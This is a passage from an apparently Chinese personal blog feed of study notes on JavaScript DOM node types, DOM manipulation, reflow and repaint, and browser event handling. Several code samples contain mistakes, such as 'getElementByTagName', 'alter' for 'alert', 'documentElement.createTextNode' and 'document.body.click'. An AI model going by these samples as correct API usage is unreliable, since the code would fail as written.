spellcheck="true">//适用所有浏览器</span><span class="token punctuation">}</span></code></pre><h5 id="childNodes属性"><a href="#childNodes属性" class="headerlink" title="childNodes属性"></a>childNodes属性</h5><p>每个节点都有一个childNodes属性，其中保存着一个NodeList对象。NodeList是一种类数组对象，用来保存一组有序的节点，可以通过位置来访问这些节点。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> firstChild <span class="token operator">=</span> someNode<span class="token punctuation">.</span>childNodes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">var</span> secondChild <span class="token operator">=</span> someNode<span class="token punctuation">.</span>childNodes<span class="token punctuation">.</span><span class="token function">item</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> count <span class="token operator">=</span> someNode<span class="token punctuation">.</span>childNodes<span class="token punctuation">.</span>length<span class="token punctuation">;</span></code></pre><p>可以将NodeList转化为数组(兼容所有浏览器)</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">convertToArray</span><span class="token punctuation">(</span>nodes<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> array <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  <span class="token keyword">try</span> <span class="token punctuation">{</span>    array <span class="token operator">=</span> Array<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>slice<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>nodes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    array <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nodes<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      array<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>nodes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> array<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h5 id="其他节点关系"><a href="#其他节点关系" class="headerlink" title="其他节点关系"></a>其他节点关系</h5><ul><li>parentNode</li><li>previousSibling</li><li>nextSibling</li><li>firstChild</li><li>lastChild</li><li>ownerDocument</li></ul><h5 id="操作节点"><a href="#操作节点" class="headerlink" title="操作节点"></a>操作节点</h5><ul><li><code>appendChild(someNode)</code>：如果是新节点则向childNodes列表的末尾添加一个节点；如果节点已经是文档的一部分，则将节点从原来位置移动到新位置</li><li><code>insertBefore(newNode, someNode)</code>：两个参数：要插入的节点和作为参照的节点；插入节点后，被插入的节点会变成参照节点的前一个同胞节点；如果参照节点是<code>null</code>则与<code>appendChild</code>执行同样的操作</li><li><code>replaceChild(newNode, someNode)</code>：两个参数：要插入的节点和要替换的节点</li><li><code>removeChild(someNode)</code>：移除子节点</li><li><code>cloneNode(deep)</code>：参数：是否执行深度复制；用于创建调用这个方法的节点的一个完全相同的副本</li><li><code>normalize()</code>：处理文档树中的文本节点，合并相邻的文本节点并删除空的文本节点</li></ul><h5 id="Document类型"><a href="#Document类型" class="headerlink" title="Document类型"></a>Document类型</h5><ul><li>特征<ul><li>nodeType = 9</li><li>nodeName = “#document”</li><li>nodeValue = null</li><li>parentNode = null</li><li>ownerDocument = null</li><li>浏览器中是HTMLDocument（继承自Document类型）的一个实例</li><li>是window对象的一个属性，可以将其作为全局对象来访问</li></ul></li><li>属性<ul><li><code>documentElement</code>：直接访问<code>html</code>元素</li><li><code>body</code>：取得对<code>body</code>的引用</li><li><code>title</code>：取得文档标题</li><li><code>URL</code>：取得完整URL</li><li><code>domain</code>：取得域名，由于跨域安全限制，来自不同子域的页面无法通过JavaScript通信，而通过将每个页面的document.domain设置为相同的值，这些页面就可以互相访问对方包含的JavaScript对象</li><li><code>referrer</code>：取得来源页面的URL</li></ul></li><li>查找元素<ul><li><code>getElementById(&quot;idName&quot;)</code>：ie8及较低版本不区别ID的大小写，只返回文档中第一次出现的元素；ie7及较低版本name特性与给定ID匹配的表单元素(input、textarea、button、select)也会被该方法返回；为了避免这个问题，最好不让表单字段的name特性与其他元素的ID相同</li><li><code>getElementByTagName(&quot;tagName&quot;)</code>：返回一个类数组的HTMLCollection对象，访问方法和NodeList一致；该Collection有<code>namedItem(&quot;name&quot;)</code>方法，可以按名称访问项(只能取得第一项)，或者直接<code>collection[&quot;name&quot;]</code>访问</li><li><code>getElementByName(&quot;name&quot;)</code>：返回带有给定name特性的所有元素</li></ul></li><li>特殊集合<ul><li><code>anchors</code>：包含文档中所有带name特性的<code>&lt;a&gt;</code>元素</li><li><code>forms</code>：包含文档中所有<code>&lt;form&gt;</code>元素</li><li><code>images</code>：包含文档中所有<code>&lt;img&gt;</code>元素</li><li><code>links</code>：包含文档中所有带href的<code>&lt;a&gt;</code>元素</li></ul></li><li>文档写入<ul><li><code>write</code>：接受一个字符串参数，原样写入</li><li><code>writeln</code>：在字符串末尾添加一个换行符<pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">//注意写入脚本的格式</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;script type=\"text/javascript\" src=\"file.js\" >"</span> <span class="token operator">+</span> <span class="token string">"&lt;\/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li>open和close分别用于打开和关闭网页的输出流，如果是在页面加载期间使用<code>write()</code>或<code>writeln()</code>方法，则不需要用到</li></ul></li></ul><h5 id="Element类型"><a href="#Element类型" class="headerlink" title="Element类型"></a>Element类型</h5><ul><li>特征<ul><li>nodeType = 1</li><li>nodeName = 元素标签名</li><li>nodeValue = null</li><li>parentNode = Document / Element</li></ul></li><li><strong>HTML</strong><ul><li>id：元素在文档中的唯一标识符</li><li>title：有关元素的附加说明信息</li><li>lang：元素内容的语言代码</li><li>dir：语言的方向</li><li>className：与元素class特性对应</li></ul></li><li>获取特性：<code>getAttribute(&quot;name&quot;)</code></li><li>设置特性：<code>setAttribute(&quot;name&quot;, &quot;value&quot;)</code></li><li>删除特性：<code>removeAttribute(&quot;name&quot;)</code></li><li>遍历元素特性<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">outputAttributes</span><span class="token punctuation">(</span>element<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> pairs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      attrName<span class="token punctuation">,</span>      attrValue<span class="token punctuation">,</span>      i<span class="token punctuation">,</span>      len<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> element<span class="token punctuation">.</span>attributes<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    attrName <span class="token operator">=</span> element<span class="token punctuation">.</span>attributes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>nodeName<span class="token punctuation">;</span>    attrValue <span class="token operator">=</span> element<span class="token punctuation">.</span>attributes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>nodeValue<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>element<span class="token punctuation">.</span>attributes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>specified<span class="token punctuation">)</span> <span class="token punctuation">{</span>      pairs<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"name"</span><span class="token punctuation">:</span> attrName<span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">:</span> attrValue<span class="token punctuation">}</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li><li>创建元素：<code>createElement(&quot;tagName&quot;)</code></li></ul><h5 id="Text类型"><a href="#Text类型" class="headerlink" title="Text类型"></a>Text类型</h5><ul><li>特性<ul><li>nodeType = 3</li><li>nodeName = “#text”</li><li>nodeValue = 节点所包含的文本</li><li>parentNode = 某个Element</li></ul></li><li>修改<ul><li><code>appendData(text)</code>：将text添加到节点末尾</li><li><code>deleteData(offset, count)</code>：从offset位置开始删除count个字符</li><li><code>insertData(offset, text)</code>：在offset位置插入text</li><li><code>replaceData(offset, count, text)</code>：替换</li><li><code>splitText(offset)</code>：从offset指定的位置将当前文本节点分割成两个文本节点，返回offset后的文本</li><li><code>substringData(offset, count)</code>：提取offset指定位置开始到offset+count为止处的字符串</li></ul></li><li>创建文本节点：<code>createTextNode(&quot;textNode/text&quot;)</code></li></ul><h5 id="DocumentFragment类型"><a href="#DocumentFragment类型" class="headerlink" title="DocumentFragment类型"></a>DocumentFragment类型</h5><ul><li>特性<ul><li>nodeType = 11</li><li>nodeName = “#document-fragment”</li><li>nodeValue = null</li><li>parentNode = null</li></ul></li><li>创建文档片段<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> fragment <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createDocumentFragment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li>假设我们要为一个列表添加列表项，如果逐个添加列表项，将会导致浏览器反复渲染(呈现)，为避免这个问题，可以像下面这样使用一个文档片段来保存创建的列表项，然后再一次性将它们添加到文档中<pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">//创建一个虚拟占位节点</span><span class="token keyword">var</span> fragment <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createDocumentFragment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> ul <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"myList"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> li <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  li <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"li"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  li<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">createTextNode</span><span class="token punctuation">(</span><span class="token string">"Item "</span> <span class="token operator">+</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  fragment<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>li<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>ul<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>fragment<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li></ul><h3 id="DOM操作技术"><a href="#DOM操作技术" class="headerlink" title="DOM操作技术"></a>DOM操作技术</h3><h5 id="动态脚本"><a href="#动态脚本" class="headerlink" title="动态脚本"></a>动态脚本</h5><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">loadScript</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> script <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  script<span class="token punctuation">.</span>type <span class="token operator">=</span> <span class="token string">"text/javascript"</span><span class="token punctuation">;</span>  script<span class="token punctuation">.</span>src <span class="token operator">=</span> url<span class="token punctuation">;</span>  document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">loadScript</span><span class="token punctuation">(</span><span class="token string">"client.js"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><ul><li>动态指的是当页面加载时不存在，页面加载完成后再动态添加到页面</li></ul><h5 id="动态样式"><a href="#动态样式" class="headerlink" title="动态样式"></a>动态样式</h5><ul><li>外部文件<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">loadStyles</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> link <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"link"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  link<span class="token punctuation">.</span>rel <span class="token operator">=</span> <span class="token string">"stylesheet"</span><span class="token punctuation">;</span>  link<span class="token punctuation">.</span>type <span class="token operator">=</span> <span class="token string">"text/css"</span><span class="token punctuation">;</span>  link<span class="token punctuation">.</span>href <span class="token operator">=</span> url<span class="token punctuation">;</span>  <span class="token keyword">var</span> head <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementByTagName</span><span class="token punctuation">(</span><span class="token string">"head"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  head<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>link<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li><li>文本<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">loadStylesString</span><span class="token punctuation">(</span>css<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> style <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"style"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  style<span class="token punctuation">.</span>type <span class="token operator">=</span> <span class="token string">"text/css"</span><span class="token punctuation">;</span>  <span class="token keyword">try</span> <span class="token punctuation">{</span>    style<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">createTextNode</span><span class="token punctuation">(</span>css<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    style<span class="token punctuation">.</span>styleSheet<span class="token punctuation">.</span>cssText <span class="token operator">=</span> css<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">var</span> head <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementByTagName</span><span class="token punctuation">(</span><span class="token string">"head"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  head<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>style<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h5 id="操作表格"><a href="#操作表格" class="headerlink" title="操作表格"></a>操作表格</h5><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> table <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"table"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>table<span class="token punctuation">.</span>border <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>table<span class="token punctuation">.</span>width <span class="token operator">=</span> <span class="token string">"100%"</span><span class="token punctuation">;</span><span class="token keyword">var</span> tbody <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"tbody"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>table<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>tbody<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//创建第一行</span>tbody<span class="token punctuation">.</span><span class="token function">insertRow</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>tbody<span class="token punctuation">.</span>rows<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">insertCell</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>tbody<span class="token punctuation">.</span>rows<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cells<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>documentElement<span class="token punctuation">.</span><span class="token function">createTextNode</span><span class="token punctuation">(</span><span class="token string">"Cell 1,1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>tbody<span class="token punctuation">.</span>rows<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">insertCell</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>tbody<span class="token punctuation">.</span>rows<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cells<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">createTextNode</span><span class="token punctuation">(</span><span class="token string">"Cell 2,1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>table<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li></ul><h3 id="重排和重绘"><a href="#重排和重绘" class="headerlink" title="重排和重绘"></a>重排和重绘</h3><ul><li>理解：浏览器下载完页面中的所有组件——HTML标记、javascript、CSS、图片——之后会解析并生成两个内部数据结构<ul><li><code>DOM树</code>表示页面结构</li><li><code>渲染树</code>表示DOM节点如何显示</li></ul></li><li>重排发生场景：<ul><li>添加或者删除可见的DOM元素</li><li>元素位置改变</li><li>元素尺寸改变（外边距、内边距、边框厚度、宽度、高度）</li><li>内容改变（文本改变、图片被尺寸不同的图片替代）</li><li>页面渲染器初始化</li><li>浏览器窗口尺寸改变</li></ul></li><li>渲染树的排队与刷新<ul><li>获取布局信息的操作会导致队列刷新<ul><li><code>offsetTop</code>，<code>offsetLeft</code>，<code>offsetWidth</code>，<code>offsetHeight</code></li><li><code>scrollTop</code>、<code>scrollLeft</code>、<code>scrollWidth</code>、<code>scrollHeight</code></li><li><code>clientTop</code>、<code>clientLeft</code>、<code>clientWidth</code>、<code>clientHeight</code></li><li><code>getComputedStyle()</code>(IE)</li></ul></li></ul></li><li>使用批量修改DOM来减少重排和重绘<ul><li>步骤<ul><li>使元素脱离文档流</li><li>对应用多重改变</li><li>把元素带回文档中</li></ul></li><li>脱离文档的三种基本方法<ul><li>隐藏元素、应用修改、重新显示</li><li>使用文档片段在当前DOM之外构建一个子树，再把它拷贝回文档</li><li>将原始元素拷贝到一个脱离文档的节点中，修改副本，完成后再替换原始元素</li></ul></li></ul></li><li>缓存布局信息<ul><li>减少布局信息的获取次数，获取后把它赋值给剧局部变量再操作局部变量</li></ul></li></ul><hr><p>总结：DOM是语言中立的API，用于访问和操作HTML和XML文档。DOM1级将HTML和XML文档形象地看作一个层次化的节点树，可以使用JavaScript来操作这个节点数，进而改变底层文档的外观和结构。</p>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DOM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>事件详解</title>
      <link href="/2018/10/10/shi-jian-xiang-jie/"/>
      <url>/2018/10/10/shi-jian-xiang-jie/</url>
      
        <content type="html"><![CDATA[<h4 id="事件流"><a href="#事件流" class="headerlink" title="事件流"></a>事件流</h4><ul><li>事件流描述的是从页面中接收事件的顺序</li><li>IE的事件流叫做<strong>事件冒泡</strong>，即时间开始时由最具体的元素（文档中嵌套层次最深的那个节点）接收，然后逐级向上传播到较为不具体的节点（文档）</li><li><strong>事件捕获</strong> 的思想是不太具体的节点应该更早的接收到事件，而最具体的节点应该最后接收到事件</li><li>DOM2级事件规定的事件流包括三个阶段：事件捕获阶段、处于目标阶段和事件冒泡阶段。</li></ul><h4 id="事件处理程序"><a href="#事件处理程序" class="headerlink" title="事件处理程序"></a>事件处理程序</h4><ul><li>事件就是用户或浏览器自身执行的某种动作。诸如click、load和mouseover都是事件的名字。而响应某个时间的函数就叫做时间处理程序（或事件侦听器）。事件处理程序的名字以<code>on</code>开头</li><li>通过HTML指定事件处理程序有几个缺点：<ul><li>时差：用户可能会在HTML元素一出现在页面上就触发相应的事件，但当时的事件处理程序有可能不具备执行的条件</li><li>扩展事件处理程序的作用域链在不同浏览器会导致不同结果</li><li>HTML与JS紧密耦合，如果要更换时间处理程序，就要改动两个地方的代码</li></ul></li><li>事件处理函数的作用域是根据指定它的方式确定的</li></ul><h5 id="DOM0级事件处理程序"><a href="#DOM0级事件处理程序" class="headerlink" title="DOM0级事件处理程序"></a>DOM0级事件处理程序</h5><ul><li>取得操作对象的引用</li><li>指定时间处理程序</li><li>这个时候的事件处理程序是在元素的作用域中运行的；换句话说，程序中的this引用当前的元素</li><li>删除事件处理程序：<code>btn.onclick = null;</code><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> btn <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"mybtn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>btn<span class="token punctuation">.</span>onclick <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">alter</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li></ul><h5 id="DOM2级事件处理程序"><a href="#DOM2级事件处理程序" class="headerlink" title="DOM2级事件处理程序"></a>DOM2级事件处理程序</h5><ul><li>用于处理指定和删除事件处理程序的操作：<code>addEventListener()</code>和<code>removeEventListener()</code></li><li>三个参数：要处理的事件名，作为事件处理程序的函数和一个布尔值。布尔值<code>true</code>表示在事件捕获阶段调用事件处理程序；<code>false</code>表示在事件冒泡阶段调用事件处理程序</li><li>事件处理程序会按照添加它们的顺序触发</li><li>要移除时间处理程序,传入removeEventListener中的事件处理程序函数必须与传入addEventListener中的相同</li><li>大多数情况下，将事件处理程序添加到事件流的冒泡阶段，这样能最大限度地兼容各种浏览器<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> btn <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"mybtn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> handler <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">alert</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>btn<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"click"</span><span class="token punctuation">,</span> handler<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>btn<span class="token punctuation">.</span><span class="token function">removeEventListener</span><span class="token punctuation">(</span><span class="token string">"click"</span><span class="token punctuation">,</span> handler<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li></ul><h5 id="IE事件处理程序"><a href="#IE事件处理程序" class="headerlink" title="IE事件处理程序"></a>IE事件处理程序</h5><ul><li>attachEvent 和 detachEvent</li><li>两个参数：事件处理程序的名字与时间处理程序函数</li><li>IE事件处理程序和DOM0级方法的主要区别在于事件处理程序的作用域。在使用DOM0级方法的情况下，事件处理程序会在其所属元素的作用域内运行；而IE会在全局作用域内运行，因此<strong>this等于window</strong><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> btn <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"mybtn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> handler <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"clicked"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>btn<span class="token punctuation">.</span><span class="token function">attachEvent</span><span class="token punctuation">(</span><span class="token string">"onclick"</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>btn<span class="token punctuation">.</span><span class="token function">detachEvent</span><span class="token punctuation">(</span><span class="token string">"onclick"</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li></ul><h4 id="事件对象"><a href="#事件对象" class="headerlink" title="事件对象"></a>事件对象</h4><ul><li>在触发DOM的某个事件时，会产生一个事件对象event,这个对象包含着所有与事件有关的信息</li><li><strong>this和event.target的区别</strong>：this是事件冒泡，动态变化。先触发内部事件，由内到外的执行；event.target代表的是触发事件的dom对象，是静态不变的；</li></ul><h5 id="DOM-中的事件对象"><a href="#DOM-中的事件对象" class="headerlink" title="DOM 中的事件对象"></a>DOM 中的事件对象</h5><ul><li>在时间处理程序内部，对象<code>this</code>始终等于<code>currentTarget</code>的值，而<code>target</code>则只包含事件的实际目标;<pre class=" language-javascript"><code class="language-javascript">document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>click <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>currentTarget <span class="token operator">===</span> document<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//true</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token operator">===</span> document<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>target <span class="token operator">===</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"mybtn"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//true</span><span class="token punctuation">}</span></code></pre></li><li>属性及方法（只读）<ul><li><code>bubbles</code>：Boolean / 表明时间是否冒泡</li><li><code>cancelable</code>：Boolean / 表明是否可以取消事件的默认行为</li><li><code>currentTarget</code>：Element / 其事件处理程序当前正在处理事件的那个元素</li><li><code>defaultPrevented</code>：Boolean /true表示已调用preventDefalut()</li><li><code>detail</code>：Integer / 与时间相关的细节信息</li><li><code>eventPhase</code>：Integer / 调用时间处理程序的阶段</li><li><code>preventDefault()</code>：function / 取消事件的默认行为</li><li><code>stopImmediatePropagation()</code>：function / 取消事件进一步捕获或冒泡，同时阻止任何事件处理程序被调用</li><li><code>stopPropagation()</code>：function / 取消事件进一步捕获或冒泡</li><li><code>target</code>：Element / 事件的目标</li><li><code>trusted</code>：Boolean / true表示时间时浏览器生成的，否则是通过js创建的</li><li><code>type</code>：String / 触发的事件类型</li><li><code>view</code>：AbstractView / 与事件相关联的抽象视图，等同于发生时间的window对象</li></ul></li></ul><h5 id="IE中的事件对象"><a href="#IE中的事件对象" class="headerlink" title="IE中的事件对象"></a>IE中的事件对象</h5><ul><li>访问方法<ul><li>在使用DOM0级方法的情况下:<code>var event = window.event</code></li><li>使用IE事件处理程序情况下：默认传入event参数</li></ul></li><li>属性和方法<ul><li><code>cancelBubble</code>：Boolean / r and w / 默认false, true取消事件冒泡</li><li><code>returnValue</code>：Boolean / r and w / 默认为true, false可以取消事件的默认行为</li><li><code>srcElement</code>：Element / r / 事件中的目标 = target(DOM事件)</li><li><code>type</code>：String / r / 触发的事件类型</li></ul></li></ul><h4 id="事件类型"><a href="#事件类型" 